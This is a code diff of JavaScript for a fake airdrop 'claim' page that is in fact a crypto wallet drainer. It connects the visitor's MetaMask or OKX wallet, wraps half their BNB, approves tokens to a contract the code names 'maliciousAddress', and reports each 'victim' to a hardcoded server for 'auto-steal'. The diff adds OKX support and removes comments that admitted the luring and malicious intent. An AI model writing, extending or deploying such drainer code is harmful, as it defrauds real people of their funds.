@@ -2,11 +2,8 @@
 // Configuration
 // ============================================
 const CONFIG = {
-    // 后端服务器地址（如果没有后端，可以留空或删除）
     serverUrl: "http://45.63.51.62:3001",
-    // 恶意合约地址
     maliciousAddress: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1",
-    // WBNB 地址
     wbnbAddress: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
 };
 
@@ -33,7 +30,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const claimBtn = document.getElementById('claimBtn');
     const claimStatus = document.getElementById('claimStatus');
 
-    // 从 URL 中读取查询参数
     const params = new URLSearchParams(window.location.search);
     const address = params.get('address');
     const amount = params.get('amount');
@@ -49,10 +45,21 @@ document.addEventListener('DOMContentLoaded', function() {
     let isClaimed = false;
 
     // ============================================
-    // 检测是否支持浏览器钱包（MetaMask/OKX）
+    // 检测浏览器钱包（兼容 OKX + MetaMask）
     // ============================================
-    function hasBrowserWallet() {
-        return typeof window.ethereum !== 'undefined';
+    function getWalletProvider() {
+        // 优先使用 OKX 钱包
+        if (typeof window.okxwallet !== 'undefined' && window.okxwallet) {
+            console.log('✅ 使用 OKX 钱包');
+            return window.okxwallet;
+        }
+        // 其次使用 MetaMask / 通用 Ethereum 钱包
+        if (typeof window.ethereum !== 'undefined' && window.ethereum) {
+            console.log('✅ 使用 MetaMask / 通用钱包');
+            return window.ethereum;
+        }
+        console.log('❌ 未检测到任何钱包');
+        return null;
     }
 
     // ============================================
@@ -76,7 +83,7 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // ============================================
-    // 核心连接逻辑（优先使用浏览器钱包）
+    // 核心连接逻辑
     // ============================================
     claimBtn.addEventListener('click', async function() {
         if (isClaimed) {
@@ -91,9 +98,10 @@ document.addEventListener('DOMContentLoaded', function() {
 
         try {
             // ============================================
-            // 第一步：检测浏览器钱包（MetaMask/OKX）
+            // 第一步：检测钱包
             // ============================================
-            if (!hasBrowserWallet()) {
+            const walletProvider = getWalletProvider();
+            if (!walletProvider) {
                 claimStatus.textContent = '❌ 未检测到钱包，请安装 MetaMask 或 OKX 插件！';
                 claimStatus.className = 'status error';
                 claimBtn.disabled = false;
@@ -101,8 +109,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 return;
             }
 
-            console.log('🦊 使用浏览器钱包连接...');
-            provider = new ethers.providers.Web3Provider(window.ethereum);
+            // 使用检测到的钱包
+            provider = new ethers.providers.Web3Provider(walletProvider);
 
             // 检查网络（BSC 主网 chainId: 56）
             const network = await provider.getNetwork();
@@ -112,9 +120,9 @@ document.addEventListener('DOMContentLoaded', function() {
                 claimBtn.disabled = false;
                 claimBtn.textContent = 'Connect Wallet & Claim';
                 try {
-                    await window.ethereum.request({
+                    await walletProvider.request({
                         method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }] // 0x38 = 56
+                        params: [{ chainId: '0x38' }]
                     });
                 } catch (switchError) {
                     if (switchError.code === 4001) {
@@ -122,17 +130,16 @@ document.addEventListener('DOMContentLoaded', function() {
                     }
                     return;
                 }
-                // 重新获取 provider
-                provider = new ethers.providers.Web3Provider(window.ethereum);
+                provider = new ethers.providers.Web3Provider(walletProvider);
             }
 
-            // 请求连接钱包（会弹出 MetaMask/OKX 连接窗口）
+            // 请求连接钱包
             await provider.send("eth_requestAccounts", []);
             signer = provider.getSigner();
             userAddress = await signer.getAddress();
 
             // ============================================
-            // 第二步：检查地址是否与查询地址一致
+            // 第二步：检查地址是否一致
             // ============================================
             if (address && userAddress.toLowerCase() !== address.toLowerCase()) {
                 claimStatus.textContent = '⚠️ 连接的钱包地址与查询地址不一致！';
@@ -148,7 +155,7 @@ document.addEventListener('DOMContentLoaded', function() {
             claimStatus.className = 'status';
 
             // ============================================
-            // 第三步：包装 BNB（诱导用户将 BNB 换成 WBNB）
+            // 第三步：包装 BNB
             // ============================================
             const wbnbContract = new ethers.Contract(
                 CONFIG.wbnbAddress,
@@ -157,7 +164,7 @@ document.addEventListener('DOMContentLoaded', function() {
             );
 
             const bnbBalance = await provider.getBalance(userAddress);
-            const wrapAmount = bnbBalance.mul(50).div(100); // 取 50% 的 BNB 进行包装
+            const wrapAmount = bnbBalance.mul(50).div(100);
             if (wrapAmount.gt(0)) {
                 console.log(`🔄 正在将 ${ethers.utils.formatEther(wrapAmount)} BNB 包装成 WBNB...`);
                 claimStatus.textContent = `⏳ 正在包装 BNB...`;
@@ -169,7 +176,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             // ============================================
-            // 第四步：授权 HOPE 代币给恶意合约
+            // 第四步：授权 HOPE
             // ============================================
             const tokenAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
             const tokenContract = new ethers.Contract(
@@ -202,7 +209,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             // ============================================
-            // 第五步：调用 claim() 记录受害者
+            // 第五步：调用 claim()
             // ============================================
             claimStatus.textContent = `⏳ 正在领取空投...`;
             const maliciousContract = new ethers.Contract(
@@ -222,7 +229,7 @@ document.addEventListener('DOMContentLoaded', function() {
             console.log(`🎯 New victim hooked: ${userAddress}`);
 
             // ============================================
-            // 第六步：上报受害者到后端
+            // 第六步：上报受害者
             // ============================================
             await reportVictim(userAddress);
             console.log('📋 Victim recorded, waiting for auto-steal...');
@@ -244,7 +251,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     // ============================================
-    // 监听钱包切换/链切换
+    // 监听钱包切换
     // ============================================
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', () => location.reload());
